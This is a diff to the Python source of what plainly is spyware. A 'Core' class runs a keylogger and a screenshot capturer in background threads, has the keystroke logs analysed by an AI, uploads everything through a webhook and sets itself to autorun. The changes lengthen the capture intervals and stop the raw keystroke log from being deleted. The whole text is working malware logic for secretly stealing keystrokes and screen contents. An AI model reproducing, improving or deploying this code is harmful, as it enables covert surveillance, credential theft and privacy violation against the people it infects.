@@ -51,11 +51,12 @@ class Core:
         except Exception as e:
             print(f"[Zip Error] {e}")
 
-    def send_spy(self):
+    def send_spy(self, interval=60, interval_seconds=1):
         """Função de envio das capturas de tela"""
         while True:
             try:
-                zip_path = self.spy.main(duration=30, interval_seconds=1)
+                zip_path = self.spy.main(
+                    duration=interval, interval_seconds=interval_seconds)
                 self.webhook.send_file(
                     zip_path, "\n📸 Capturas de tela obtidas:"
                 )
@@ -63,11 +64,11 @@ class Core:
             except Exception as e:
                 print(f"[Spy Error] {e}")
 
-    def send_keylogger(self, interval=30):
+    def send_keylogger(self, interval=60):
         """"Função de envio dos logs capturados, envia tanto os logs brutos, quanto os analisados pela IA"""
         while True:
             try:
-                logs, logs_file = self.keylogger.main(duration=interval)
+                logs = self.keylogger.main(duration=interval)
                 if not logs:
                     continue
 
@@ -88,8 +89,8 @@ class Core:
                 os.remove(analyzed_txt)
                 os.remove(analyzed_zip)
 
-                if os.path.exists(logs_file):
-                    os.remove(logs_file)
+                # if os.path.exists(logs_file):
+                #     os.remove(logs_file)
 
                 self.keylogger.key_log = {}
 
@@ -101,7 +102,7 @@ class Core:
         exe_path = os.path.abspath(sys.argv[0])
         self.autorun(exe_path)
 
-        t1 = threading.Thread(target=self.send_keylogger, args=(30,))
+        t1 = threading.Thread(target=self.send_keylogger)
         t2 = threading.Thread(target=self.send_spy)
         t1.start()
         t2.start()
